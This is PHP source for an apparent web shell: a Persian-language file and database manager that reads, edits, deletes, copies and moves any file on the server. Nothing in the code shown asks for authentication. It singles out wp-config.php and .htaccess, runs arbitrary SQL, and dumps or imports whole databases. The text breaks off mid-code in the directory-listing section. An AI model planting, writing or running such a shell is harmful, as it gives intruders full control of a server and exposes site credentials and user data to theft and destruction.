<?php
ini_set('max_execution_time', '-1');
ini_set('memory_limit', '-1');
ini_set('error_reporting', 0);
$dirtohome = "/";
$dirhelp = explode("/", $_SERVER['DOCUMENT_ROOT']);
$dirhelp2 = array();
array_shift($dirhelp);
foreach ($dirhelp as $val) {
    if ($val != "public_html") {
        $dirhelp2[] = $val;
    } else {
        $dirhelp2[] = $val;
        break;
    }
}
$dirhelp = implode("/", $dirhelp2);
?>
<?php
if (@$_REQUEST['command'] != "check" && @$_REQUEST['command'] != "checkdel" && !isset($_REQUEST['dir'])) {
?>
    <!DOCTYPE HTML>
    <html>

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    </head>

    <body>
        <style>
            * {
                direction: rtl;
                text-align: right;
            }

            input,
            textarea,
            pre,
            #left,
            #leftall,
            #leftall * {
                direction: ltr;
                text-align: left;
            }
        </style>
        <div class="container">
        <?php
    }
    if (@$_REQUEST['command'] == "check") {
        if (@end(explode("/", $_REQUEST['value'])) == "dathtaccess") {
            @$_REQUEST['value'] = str_replace(end(explode("/", $_REQUEST['value'])), ".htaccess", $_REQUEST['value']);
        } elseif (@end(explode("/", $_REQUEST['value'])) == "wpconfig.php" && !file_exists($dirtohome . $_REQUEST['value'])) {
            @$_REQUEST['value'] = str_replace(end(explode("/", $_REQUEST['value'])), "wp-config.php", $_REQUEST['value']);
        }
        $myfile = fopen($dirtohome . $_REQUEST['value'], "r") or die("Unable to open file!");
        echo fread($myfile, filesize($dirtohome . $_REQUEST['value']));
    } elseif (@$_REQUEST['command'] == "checkdel") {
        $exists = file_exists($dirtohome . $_REQUEST['value']) or die("Unable to open file!");
    } elseif (@$_REQUEST['command'] == "remove") {
        function deleteFolder($path)
        {
            if (is_dir($path) === true) {
                $files = array_diff(scandir($path), array('.', '..'));
                foreach ($files as $file) {
                    deleteFolder(realpath($path) . '/' . $file);
                }
                return rmdir($path);
            } elseif (is_file($path) === true) {
                return unlink($path);
            }
            return false;
        }
        if (@end(explode("/", $_REQUEST['dirhide'])) == "dathtaccess") {
            @$_REQUEST['dirhide'] = str_replace(end(explode("/", $_REQUEST['dirhide'])), ".htaccess", $_REQUEST['dirhide']);
        } elseif (@end(explode("/", $_REQUEST['dirhide'])) == "wpconfig.php" && !file_exists($dirtohome . $_REQUEST['dirhide'])) {
            @$_REQUEST['dirhide'] = str_replace(end(explode("/", $_REQUEST['dirhide'])), "wp-config.php", $_REQUEST['dirhide']);
        }
        deleteFolder($dirtohome . $_REQUEST['dirhide']);
        if (isset($_REQUEST['re']) && $_REQUEST['re'] == 2) {
            echo "<script type='text/javascript'>window.top.location='?command=dirlist&dirlist=" . $_REQUEST['dirlist'] . "'</script>";
            exit();
        }
        if (isset($_REQUEST['re']) && $_REQUEST['re'] == 3) {
            echo "<script type='text/javascript'>window.top.location='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'</script>";
            exit();
        }
        echo "<script type='text/javascript'>window.top.location='?command=delete" . "'</script>";
        exit();
    } elseif (@$_REQUEST['command'] == "edit") {
        if (@end(explode("/", $_REQUEST['dirhide'])) == "dathtaccess") {
            @$_REQUEST['dirhide'] = str_replace(end(explode("/", $_REQUEST['dirhide'])), ".htaccess", $_REQUEST['dirhide']);
        } elseif (@end(explode("/", $_REQUEST['dirhide'])) == "wpconfig.php" && !file_exists($dirtohome . $_REQUEST['dirhide'])) {
            @$_REQUEST['dirhide'] = str_replace(end(explode("/", $_REQUEST['dirhide'])), "wp-config.php", $_REQUEST['dirhide']);
        }
        $myfile = fopen($dirtohome . $_REQUEST['dirhide'], $_REQUEST['type']) or die("Unable to open file!");
        $txt = $_REQUEST['view'];
        fwrite($myfile, $txt);
        fclose($myfile);
        echo "<script type='text/javascript'>window.top.location='?command=read" . "'</script>";
        exit();
    } elseif (@$_REQUEST['command'] == "read") {
        ?>
            <!-- <script type="text/javascript" src="https://1pooyesh.ir/template/editarea_0_8_2/edit_area/edit_area_full.js"></script> -->
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-12">
                        <label for="dirhide">مسیر</label>
                        <input name="dirhide" class="form-control" id="dirhide" value="<?php echo $_REQUEST['dirlist'] ? $_REQUEST['dirlist'] : $dirhelp ?>">
                    </div>
                </div>
                <div class="row form-group">
                    <div class="col-12">
                        <button type="button" class="btn btn-primary" id="check">جست و جو</button>
                    </div>
                </div>
                <br>
                <div style="display: none;">
                    <div class="row form-group">
                        <div class="col-12">
                            <label for="view">نمایش کد</label>
                            <div id="left" class="rounded-sm" style="max-height: 500px;overflow-x: hidden;overflow-y: scroll;">
                                <div class="row p-3" id="leftall">
                                    <textarea id="rows" class="bg-info text-center form-control col-3 col-sm-2 col-md-1" style="overflow-y: hidden;overflow-x: scroll;resize: none;border-right: none;border-top-right-radius: 0;border-bottom-right-radius: 0;" wrap="off" class="form-control" readonly></textarea>
                                    <textarea style="color:#c1c1c1;overflow-y: hidden;overflow-x: scroll;resize: none;border-left: none;border-top-left-radius: 0;border-bottom-left-radius: 0;" name="view" wrap="off" class="bg-dark form-control col tabSupport" id="view"></textarea>
                                </div>
                            </div>
                            <div class="row form-group" id="leftall">
                                <div class="mt-3 col-12">
                                    <input type="text" placeholder="find" id="termSearch" name="termSearch" class="form-control">
                                </div>
                                <div class="mt-3 col-12">
                                    <input type="text" placeholder="replace" id="termReplace" name="termReplace" class="form-control">
                                </div>
                            </div>
                            <div class="mt-3 row custom-control custom-checkbox" id="leftall">
                                <div class="col-12">
                                    <input type="checkbox" name="caseSensitive" id="caseSensitive" class="custom-control-input" data-checked="0">
                                    <label class="custom-control-label" for="caseSensitive">Case Sensitive</label>
                                </div>
                            </div>
                            <div class="mt-3 row" id="leftall">
                                <div class="col-4"><a href="#" class="btn btn-primary col-12" onclick="SAR.find(); return false;" id="find">FIND</a></div>
                                <div class="col-4"><a href="#" class="btn btn-primary col-12" onclick="SAR.findAndReplace(); return false;" id="findAndReplace">REPLACE</a></div>
                                <div class="col-4"><a href="#" class="btn btn-primary col-12" onclick="SAR.replaceAll(); return false;" id="replaceAll">REPLACE ALL</a></div>
                            </div>
                        </div>
                    </div>
                    <div class="row form-group">
                        <div class="col-12">
                            <label for="type">نوع</label>
                            <select id="type" name="type" class="form-control">
                                <option value="w">فایل تبدیل شود</option>
                                <option value="a">به فایل اضافه شود</option>
                            </select>
                        </div>
                    </div>
                    <div class="row form-group">
                        <div class="col-12">
                            <input type="hidden" class="btn btn-primary" name="command" value="edit">
                            <button type="submit" class="btn btn-primary" id="edit">ویرایش</button>
                        </div>
                    </div>
                </div>
            </form>
            <script>
                $("#check").click(function() {
                    $("#check").text("جست و جو...");
                    var value = $("#dirhide").val();
                    $.ajax({
                        type: "POST",
                        url: "?command=check&value=" + value,
                        success: function(response) {
                            $("#check").text("جست و جو");
                            $("#view").parent().parent().parent().parent().parent().show();
                            // var format=value.split(".");
                            // format=format[format.length-1];
                            // editAreaLoader.init({
                            // id: "view"
                            // ,start_highlight: true
                            // ,allow_resize: "y"
                            // ,allow_toggle: false
                            // ,word_wrap: false
                            // ,language: "en"
                            // ,syntax: format
                            // ,toolbar: "search, go_to_line, fullscreen, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help"
                            // ,start_highlight: true
                            // });
                            $("#rows").html("");
                            $("#view").val(response);
                            var each = response.split("\n");
                            var rows = 0;
                            $.each(each, function(val, key) {
                                rows++;
                                if (rows == each.length) {
                                    $("#rows").append(rows);
                                } else {
                                    $("#rows").append(rows + "\n");
                                }
                            });
                            rows = rows == 0 ? 1 : rows;
                            $("#view").attr("rows", rows);
                            $("#rows").attr("rows", rows);
                        }
                    });
                });
                $("#view").on("keyup", function() {
                    var oldrow = $("#rows").val().split("\n").length;
                    var newrow = $(this).val().split("\n").length;
                    if (newrow > oldrow) {
                        while (newrow > oldrow) {
                            oldrow++;
                            $("#rows").append("\n" + oldrow);
                        }
                    } else if (newrow < oldrow) {
                        while (newrow < oldrow) {
                            oldrow--;
                            var end = $("#rows").val().length - $("#rows").val().split("\n")[oldrow].toString().length;
                            end--;
                            var each = $("#rows").val().slice(0, end);
                            $("#rows").html(each);
                        }
                    }
                    var rows = $("#rows").val().split("\n").length;
                    rows = rows == 0 ? 1 : rows;
                    $("#view").attr("rows", rows);
                    $("#rows").attr("rows", rows);
                });
            </script>
            <script>
                $(function() {
                    var enabled = true;
                    $("textarea.tabSupport").keydown(function(e) {

                        // Escape key toggles tab on/off
                        if (e.keyCode == 27) {
                            enabled = !enabled;
                            return false;
                        }

                        // Enter Key?
                        if (e.keyCode === 13 && enabled) {
                            // selection?
                            if (this.selectionStart == this.selectionEnd) {
                                // find start of the current line
                                var sel = this.selectionStart;
                                var text = $(this).val();
                                while (sel > 0 && text[sel - 1] != '\n')
                                    sel--;

                                var lineStart = sel;
                                while (text[sel] == ' ' || text[sel] == '\t')
                                    sel++;

                                if (sel > lineStart) {
                                    // Insert carriage return and indented text
                                    document.execCommand('insertText', false, "\n" + text.substr(lineStart, sel - lineStart));

                                    // Scroll caret visible
                                    this.blur();
                                    this.focus();
                                    return false;
                                }
                            }
                        }

                        // Tab key?
                        if (e.keyCode === 9 && enabled) {
                            // selection?
                            if (this.selectionStart == this.selectionEnd) {
                                // These single character operations are undoable
                                if (!e.shiftKey) {
                                    document.execCommand('insertText', false, "\t");
                                } else {
                                    var text = this.value;
                                    if (this.selectionStart > 0 && text[this.selectionStart - 1] == '\t') {
                                        document.execCommand('delete');
                                    }
                                }
                            } else {
                                // Block indent/unindent trashes undo stack.
                                // Select whole lines
                                var selStart = this.selectionStart;
                                var selEnd = this.selectionEnd;
                                var text = $(this).val();
                                while (selStart > 0 && text[selStart - 1] != '\n')
                                    selStart--;
                                while (selEnd > 0 && text[selEnd - 1] != '\n' && selEnd < text.length)
                                    selEnd++;

                                // Get selected text
                                var lines = text.substr(selStart, selEnd - selStart).split('\n');

                                // Insert tabs
                                for (var i = 0; i < lines.length; i++) {
                                    // Don't indent last line if cursor at start of line
                                    if (i == lines.length - 1 && lines[i].length == 0)
                                        continue;

                                    // Tab or Shift+Tab?
                                    if (e.shiftKey) {
                                        if (lines[i].startsWith('\t'))
                                            lines[i] = lines[i].substr(1);
                                        else if (lines[i].startsWith("    "))
                                            lines[i] = lines[i].substr(4);
                                    } else
                                        lines[i] = "\t" + lines[i];
                                }
                                lines = lines.join('\n');

                                // Update the text area
                                this.value = text.substr(0, selStart) + lines + text.substr(selEnd);
                                this.selectionStart = selStart;
                                this.selectionEnd = selStart + lines.length;
                            }

                            return false;
                        }

                        enabled = true;
                        return true;
                    });
                });
            </script>
            <script>
                $("#caseSensitive").change(function() {
                    var checked = $("#caseSensitive").attr("data-checked");
                    checked++;
                    $("#caseSensitive").attr("data-checked", checked);
                })
                var SAR = {};

                SAR.find = function() {
                    // collect variables
                    var txt = $("#view").val();
                    var strSearchTerm = $("#termSearch").val();
                    var isCaseSensitive = ($("#caseSensitive").attr('data-checked') % 2) == 1 ? true : false;

                    // make text lowercase if search is supposed to be case insensitive
                    if (isCaseSensitive == false) {
                        txt = txt.toLowerCase();
                        strSearchTerm = strSearchTerm.toLowerCase();
                    }

                    // find next index of searchterm, starting from current cursor position
                    var cursorPos = ($("#view").getCursorPosEnd());
                    var termPos = txt.indexOf(strSearchTerm, cursorPos);

                    // if found, select it
                    if (termPos != -1) {
                        $("#view").selectRange(termPos, termPos + strSearchTerm.length);
                    } else {
                        // not found from cursor pos, so start from beginning
                        termPos = txt.indexOf(strSearchTerm);
                        if (termPos != -1) {
                            $("#view").selectRange(termPos, termPos + strSearchTerm.length);
                        } else {
                            alert("not found");
                        }
                    }
                };

                SAR.findAndReplace = function() {
                    // collect variables
                    var origTxt = $("#view").val(); // needed for text replacement
                    var txt = $("#view").val(); // duplicate needed for case insensitive search
                    var strSearchTerm = $("#termSearch").val();
                    var strReplaceWith = $("#termReplace").val();
                    var isCaseSensitive = ($("#caseSensitive").attr('data-checked') % 2) == 1 ? true : false;
                    var termPos;

                    // make text lowercase if search is supposed to be case insensitive
                    if (isCaseSensitive == false) {
                        txt = txt.toLowerCase();
                        strSearchTerm = strSearchTerm.toLowerCase();
                    }

                    // find next index of searchterm, starting from current cursor position
                    var cursorPos = ($("#view").getCursorPosEnd());
                    var termPos = txt.indexOf(strSearchTerm, cursorPos);
                    var newText = '';

                    // if found, replace it, then select it
                    if (termPos != -1) {
                        newText = origTxt.substring(0, termPos) + strReplaceWith + origTxt.substring(termPos + strSearchTerm.length, origTxt.length)
                        $("#view").val(newText);
                        $("#view").selectRange(termPos, termPos + strReplaceWith.length);
                    } else {
                        // not found from cursor pos, so start from beginning
                        termPos = txt.indexOf(strSearchTerm);
                        if (termPos != -1) {
                            newText = origTxt.substring(0, termPos) + strReplaceWith + origTxt.substring(termPos + strSearchTerm.length, origTxt.length)
                            $("#view").val(newText);
                            $("#view").selectRange(termPos, termPos + strReplaceWith.length);
                        } else {
                            alert("not found");
                        }
                    }
                };

                SAR.replaceAll = function() {
                    // collect variables
                    var origTxt = $("#view").val(); // needed for text replacement
                    var txt = $("#view").val(); // duplicate needed for case insensitive search
                    var strSearchTerm = $("#termSearch").val();
                    var strReplaceWith = $("#termReplace").val();
                    var isCaseSensitive = ($("#caseSensitive").attr('data-checked') % 2) == 1 ? true : false;

                    // make text lowercase if search is supposed to be case insensitive
                    if (isCaseSensitive == false) {
                        txt = txt.toLowerCase();
                        strSearchTerm = strSearchTerm.toLowerCase();
                    }

                    // find all occurances of search string
                    var matches = [];
                    var pos = txt.indexOf(strSearchTerm);
                    while (pos > -1) {
                        matches.push(pos);
                        pos = txt.indexOf(strSearchTerm, pos + 1);
                    }

                    for (var match in matches) {
                        SAR.findAndReplace();
                    }
                };


                /* TWO UTILITY FUNCTIONS YOU WILL NEED */
                $.fn.selectRange = function(start, end) {
                    return this.each(function() {
                        if (this.setSelectionRange) {
                            this.focus();
                            this.setSelectionRange(start, end);
                        } else if (this.createTextRange) {
                            var range = this.createTextRange();
                            range.collapse(true);
                            range.moveEnd('character', end);
                            range.moveStart('character', start);
                            range.select();
                        }
                    });
                };

                $.fn.getCursorPosEnd = function() {
                    var pos = 0;
                    var input = this.get(0);
                    // IE Support
                    if (document.selection) {
                        input.focus();
                        var sel = document.selection.createRange();
                        pos = sel.text.length;
                    }
                    // Firefox support
                    else if (input.selectionStart || input.selectionStart == '0')
                        pos = input.selectionEnd;
                    return pos;
                };
            </script>
        <?php
    } elseif (@$_REQUEST['command'] == "delete") {
        ?>
            <div class="row form-group">
                <div class="col-12">
                    <label for="dir">مسیر</label>
                    <input name="dir" class="form-control" id="dir">
                </div>
            </div>
            <div class="row form-group">
                <div class="col-12">
                    <button class="btn btn-primary" id="check">جست و جو</button>
                </div>
            </div>
            <script>
                $("#check").click(function() {
                    $("#check").text("جست و جو...");
                    var value = $("#dir").val();
                    $.ajax({
                        type: "POST",
                        url: "?command=checkdel&value=" + value,
                        success: function(response) {
                            $("#check").text("جست و جو");
                            if (response == "Unable to open file!") {
                                $("#view").text("این مکان وجود ندارد.");
                                $("#view").addClass("disabled");
                                $("#view").attr("disabled", "disabled");
                                $("#view").show();
                                $("#dirhide").val(value);
                            } else {
                                $("#view").text("برای حذف اینجا را کلیک کنید.");
                                $("#view").removeClass("disabled");
                                $("#view").removeAttr("disabled");
                                $("#view").show();
                                $("#dirhide").val(value);
                            }
                        }
                    });
                });
            </script>
            <br>
            <form class="form" method="post" enctype="multipart/form-data">
                <input type="hidden" name="command" value="remove">
                <input type="hidden" id="dirhide" name="dirhide">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="col-12 btn btn-danger" style="display: none;" id="view"></button>
                    </div>
                </div>
            </form>
            <?php
        } elseif (@$_REQUEST['command'] == "sqledit") {
            @$query1 = $_REQUEST['query1'];
            @$query2 = $_REQUEST['query2'];
            @$query .= $_REQUEST['query'];
            @$query .= $query1 . $query2;
            @define('MYSQLHOST', $_REQUEST['HOST']);                //هاست
            @define('MYSQLUSER', $_REQUEST['USER']);                //يوزر نيم
            @define('MYSQLPASS', $_REQUEST['PASS']);                //پسورد
            @define('MYSQLDB', $_REQUEST['DB']);                    //ديتابيس
            if (!empty($query)) {
                class DB
                {
                    private $connection;
                    private $result;
                    function query($query)
                    {
                        $this->connection = mysqli_connect(MYSQLHOST, MYSQLUSER, MYSQLPASS, MYSQLDB);
                        if (!mysqli_connect_error()) {
                            mysqli_query($this->connection, "SET NAMES 'utf8'");
                            $this->result = mysqli_query($this->connection, $query);
                            mysqli_close($this->connection);
                        }
                    }
                    function result()
                    {
                        return $this->result;
                    }
                    function rows()
                    {
                        return mysqli_num_rows($this->result);
                    }
                    function rows2()
                    {
                        return mysqli_affected_rows($this->result);
                    }
                    function fetch()
                    {
                        return mysqli_fetch_assoc($this->result);
                    }
                }
                if ($query == "infodb") {
                    $sql = new DB;
                    if (MYSQLDB == "") {
                        $sql->query("select * from information_schema.tables");
                    } else {
                        $sql->query("select * from information_schema.tables where TABLE_SCHEMA='" . MYSQLDB . "'");
                    }
                    while ($info = $sql->fetch()) {
                        echo "<pre>";
                        print_r($info);
                        echo "</pre>";
                    }
                } elseif ($query == "infouser") {
                    $sql = new DB;
                    $sql->query("SHOW GRANTS");
                    while ($info = $sql->fetch()) {
                        echo "<pre>";
                        print_r($info);
                        echo "</pre>";
                    }
                } elseif ($query == "export") {
                    function Export_Database($host, $user, $pass, $name,  $tables = false, $backup_name = false)
                    {
                        $mysqli = new mysqli($host, $user, $pass, $name);
                        $mysqli->select_db($name);
                        $mysqli->query("SET NAMES 'utf8'");
                        $queryTables    = $mysqli->query('SHOW TABLES');
                        while ($row = $queryTables->fetch_row()) {
                            $target_tables[] = $row[0];
                        }
                        if ($tables !== false) {
                            $target_tables = array_intersect($target_tables, $tables);
                        }
                        foreach ($target_tables as $table) {
                            $content = (!isset($content) ?  '' : $content) . "DROP TABLE `" . $table . "`;";
                            $result         =   $mysqli->query('SELECT * FROM ' . $table);
                            $fields_amount  =   $result->field_count;
                            $rows_num = $mysqli->affected_rows;
                            $res            =   $mysqli->query('SHOW CREATE TABLE ' . $table);
                            $TableMLine     =   $res->fetch_row();
                            $content        = (!isset($content) ?  '' : $content) . "\n\n" . $TableMLine[1] . ";\n\n";

                            for ($i = 0, $st_counter = 0; $i < $fields_amount; $i++, $st_counter = 0) {
                                while ($row = $result->fetch_row()) {
                                    if ($st_counter % 100 == 0 || $st_counter == 0) {
                                        $content .= "\nINSERT INTO " . $table . " VALUES";
                                    }
                                    $content .= "\n(";
                                    for ($j = 0; $j < $fields_amount; $j++) {
                                        $row[$j] = str_replace("\n", "\\n", addslashes($row[$j]));
                                        if (isset($row[$j])) {
                                            $content .= '"' . $row[$j] . '"';
                                        } else {
                                            $content .= '""';
                                        }
                                        if ($j < ($fields_amount - 1)) {
                                            $content .= ',';
                                        }
                                    }
                                    $content .= ")";
                                    if ((($st_counter + 1) % 100 == 0 && $st_counter != 0) || $st_counter + 1 == $rows_num) {
                                        $content .= ";";
                                    } else {
                                        $content .= ",";
                                    }
                                    $st_counter = $st_counter + 1;
                                }
                            }
                            $content .= "\n\n\n";
                        }
                        return $content;
                    }
                    $backup_file_name = 'backupsql -d' . MYSQLDB . ' -t' . time() . '.sql';
                    if (!empty($_REQUEST['tables'])) {
                        $tables = explode("---", $_REQUEST['tables']);
                    }
                    $tables = $tables == "" ? false : $tables;
                    $export = Export_Database(MYSQLHOST, MYSQLUSER, MYSQLPASS, MYSQLDB, $tables, $backup_file_name);
                    $myfile = fopen($backup_file_name, 'w') or die("Unable to open file!");
                    fwrite($myfile, $export);
                    fclose($myfile);
                    echo "<pre>export success downloading...</pre>";
                    echo "<script type='text/javascript'>window.top.location='?command=downloader&dir=" . substr(getcwd(), 1) . "/" . $backup_file_name . "&del=1'</script>";
                } elseif ($query == "import") {
                    $querys = explode(";", file_get_contents($_FILES["import"]["tmp_name"]));
                    $import = new DB;
                    foreach ($querys as $val) {
                        $import->query($val);
                    }
                    echo "<pre>import success</pre>";
                } else {
                    $sql = new DB;
                    $sql->query($query1 . " " . $query2);
                    while ($f = $sql->fetch()) {
                        echo "<pre>";
                        print_r($f);
                        echo "</pre>";
                    }
                }
            } else {
            ?>
                <form class="form" method="post" enctype="multipart/form-data">
                    <div class="row form-group" style="direction: ltr;">
                        <div class="col-6">
                            <label for="query1" id="left">query(1)</label>
                            <textarea class="form-control" id="query1" name="query1"></textarea>
                        </div>
                        <div class="col-6">
                            <label for="query2" id="left">query(2)</label>
                            <textarea class="form-control" id="query2" name="query2"></textarea>
                        </div>
                        <div class="col-3">
                            <label for="HOST">هاست</label>
                            <input type="text" class="form-control" id="HOST" name="HOST">
                        </div>
                        <div class="col-3">
                            <label for="USER">یوزرنیم</label>
                            <input type="text" class="form-control" id="USER" name="USER">
                        </div>
                        <div class="col-3">
                            <label for="PASS">پسورد</label>
                            <input type="text" class="form-control" id="PASS" name="PASS">
                        </div>
                        <div class="col-3">
                            <label for="DB">دیتابیس</label>
                            <input type="text" class="form-control" id="DB" name="DB">
                        </div>
                    </div>
                    <input type="hidden" name="command" value="sqledit">
                    <div class="row form-group">
                        <div class="col-12">
                            <button class="btn btn-primary">ارسال</button>
                        </div>
                    </div>
                </form>
                <form class="form" method="post" enctype="multipart/form-data">
                    <h4>export</h4>
                    <div class="row form-group" style="direction: ltr;">
                        <div class="col-4">
                            <label for="HOST">هاست</label>
                            <input type="text" class="form-control" id="HOST" name="HOST">
                        </div>
                        <div class="col-4">
                            <label for="USER">یوزرنیم</label>
                            <input type="text" class="form-control" id="USER" name="USER">
                        </div>
                        <div class="col-4">
                            <label for="PASS">پسورد</label>
                            <input type="text" class="form-control" id="PASS" name="PASS">
                        </div>
                        <div class="col-6">
                            <label for="DB">دیتابیس</label>
                            <input type="text" class="form-control" id="DB" name="DB">
                        </div>
                        <div class="col-6">
                            <label for="tables">جدول های</label>
                            <input type="text" class="form-control" id="tables" name="tables">
                        </div>
                    </div>
                    <input type="hidden" name="command" value="sqledit">
                    <input type="hidden" name="query" value="export">
                    <div class="row form-group">
                        <div class="col-12">
                            <button class="btn btn-primary">ارسال</button>
                        </div>
                    </div>
                </form>
                <form class="form" method="post" enctype="multipart/form-data">
                    <h4>import</h4>
                    <div class="row form-group" style="direction: ltr;">
                        <div class="col-12">
                            <label for="import" id="left">sql file</label>
                            <input type="file" class="form-control" id="import" name="import">
                        </div>
                        <div class="col-3">
                            <label for="HOST">هاست</label>
                            <input type="text" class="form-control" id="HOST" name="HOST">
                        </div>
                        <div class="col-3">
                            <label for="USER">یوزرنیم</label>
                            <input type="text" class="form-control" id="USER" name="USER">
                        </div>
                        <div class="col-3">
                            <label for="PASS">پسورد</label>
                            <input type="text" class="form-control" id="PASS" name="PASS">
                        </div>
                        <div class="col-3">
                            <label for="DB">دیتابیس</label>
                            <input type="text" class="form-control" id="DB" name="DB">
                        </div>
                    </div>
                    <input type="hidden" name="command" value="sqledit">
                    <input type="hidden" name="query" value="import">
                    <div class="row form-group">
                        <div class="col-12">
                            <button class="btn btn-primary">ارسال</button>
                        </div>
                    </div>
                </form>
            <?php
            }
        } elseif (@$_REQUEST['command'] == "mkf") {
            if (isset($_REQUEST['dir'])) {
                if (isset($_REQUEST['re'])) {
                    if ($_REQUEST['type'] == 2) {
                        mkdir($dirtohome . $_REQUEST['dir'] . $_REQUEST['name']) or die("Unable to create folder!");
                    } elseif ($_REQUEST['type'] == 1) {
                        $myfile = fopen($dirtohome . $_REQUEST['dir'] . $_REQUEST['name'], "a") or die("Unable to create file!");
                    }
                    echo "<script type='text/javascript'>window.top.location='" . $_REQUEST['re'] . "'</script>";
                    exit();
                }
                if ($_REQUEST['type'] == 2) {
                    mkdir($dirtohome . $_REQUEST['dir']) or die("Unable to create folder!");
                } elseif ($_REQUEST['type'] == 1) {
                    $myfile = fopen($dirtohome . $_REQUEST['dir'], "a") or die("Unable to create file!");
                }
                echo "<script type='text/javascript'>window.top.location='?command=mkf" . "'</script>";
                exit();
            }
            ?>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-8">
                        <label for="dir">ادرس</label>
                        <input class="form-control" id="dir" name="dir">
                    </div>
                    <div class="col-4">
                        <label for="type">نوع</label>
                        <select class="form-control" id="type" name="type">
                            <option value="0" hidden>نتخاب کنید</option>
                            <option value="1">فایل</option>
                            <option value="2">فولدر</option>
                        </select>
                    </div>
                </div>
                <input type="hidden" name="command" value="mkf">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
        <?php
        } elseif (@$_REQUEST['command'] == "copy") {
            if (isset($_REQUEST['dirmove'])) {
                rename($dirtohome . $_REQUEST['dirmove'], $dirtohome . $_REQUEST['to']. $_REQUEST['key']);
                if (isset($_REQUEST['re'])) {
                    echo "<script type='text/javascript'>window.top.location='" . $_REQUEST['re'] . "'</script>";
                    exit();
                }
                echo "<script type='text/javascript'>window.top.location='?command=copy" . "'</script>";
                exit();
            } elseif (isset($_REQUEST['dirrename'])) {
                rename($dirtohome . $_REQUEST['dirrename'] . $_REQUEST['from'], $dirtohome . $_REQUEST['dirrename'] . $_REQUEST['to']);
                if (isset($_REQUEST['re'])) {
                    echo "<script type='text/javascript'>window.top.location='" . $_REQUEST['re'] . "'</script>";
                    exit();
                }
                echo "<script type='text/javascript'>window.top.location='?command=copy" . "'</script>";
                exit();
            } elseif (isset($_REQUEST['dircopy'])) {
                function rrmdir($dir)
                {
                    if (is_dir($dir)) {
                        $files = scandir($dir);
                        foreach ($files as $file)
                            if ($file != "." && $file != "..") rrmdir("$dir/$file");
                        rmdir($dir);
                    } else if (file_exists($dir)) unlink($dir);
                }
                function rcopy($src, $dst)
                {
                    if (file_exists($dst)) rrmdir($dst);
                    if (is_dir($src)) {
                        mkdir($dst);
                        $files = scandir($src);
                        foreach ($files as $file)
                            if ($file != "." && $file != "..") rcopy("$src/$file", "$dst/$file");
                    } elseif (file_exists($src)) copy($src, $dst);
                }
                rcopy($dirtohome . $_REQUEST['dircopy'], $dirtohome . $_REQUEST['to'] . $_REQUEST['key']);
                if (isset($_REQUEST['re'])) {
                    echo "<script type='text/javascript'>window.top.location='" . $_REQUEST['re'] . "'</script>";
                    exit();
                }
                echo "<script type='text/javascript'>window.top.location='?command=copy" . "'</script>";
                exit();
            }
        ?>
            <h4>انتقال</h4>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-6">
                        <label for="dirmove">ادرس</label>
                        <input class="form-control" id="dirmove" name="dirmove">
                    </div>
                    <div class="col-6">
                        <label for="to">به</label>
                        <input class="form-control" id="to" name="to">
                    </div>
                </div>
                <input type="hidden" name="command" value="copy">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
            <br>
            <h4>کپی</h4>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-6">
                        <label for="dircopy">ادرس</label>
                        <input class="form-control" id="dircopy" name="dircopy">
                    </div>
                    <div class="col-6">
                        <label for="to">به</label>
                        <input class="form-control" id="to" name="to">
                    </div>
                </div>
                <input type="hidden" name="command" value="copy">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
        <?php
        } elseif (@$_REQUEST['command'] == "dirlist") {
            function getscandir($dir, $from, $to, $ser)
            {
                $dir2 = $dir;
                $serv = explode("/", $ser);
                if (empty($dir)) {
                    $from--;
                }
                for ($i = $from + 1; $i <= $to; $i++) {
                    if ($i != 0) {
                        if ($i == $to) {
                            $add .= $serv[$i];
                        } else {
                            $add .= $serv[$i] . "/";
                        }
                    }
                }
                if (!empty($dir) && !empty(@$add)) {
                    $dir2 .= "/" . $add;
                } else {
                    $dir2 .= @$add;
                }
                $file = scandir("/" . $dir2);
                $GLOBALS['req'] = $dir2;
                if ($file === false) {
                    $to++;
                    if (empty($dir)) {
                        $from++;
                    }
                    $file = getscandir($dir, $from, $to, $ser);
                }
                return $file;
            }
            $req = "";
            $req = @$_REQUEST['dirlist'];
            $di = explode("/", $req);
            $files1 = getscandir($req, count($di), (count($di) - 1), $_SERVER['SCRIPT_FILENAME']);
            foreach ($files1 as $val => $key) {
                if ($val == 1) {
                    $dir = "";
                    $ddd = $req == "" ? "" : "/";
                    $di = explode("/", $req);
                    foreach ($di as $val => $key) {
                        if ($val == count($di) - 1) {
                        } elseif ($val == count($di) - 2) {
                            $dir .= $key;
                        } else {
                            $dir .= $key . "/";
                        }
                    }
                    echo "<div class='row' id='leftall'><div class='col-6 pb-1 pt-3' id='leftall'><a class='btn btn-warning col-12 text-center' data-toggle='modal' data-target='#newfolder'>new folder</a></div>";
                    echo "<div class='col-6 pb-1 pt-3' id='leftall'><a class='btn btn-warning col-12 text-center' data-toggle='modal' data-target='#newfile'>new file</a></div></div>";
                    echo "<div class='col-12 p-0 pt-1 pb-2' id='leftall'><a class='btn btn-dark col-12 text-center' href='?command=dirlist&dirlist=" . $dir . "'>up folder</a></div>";

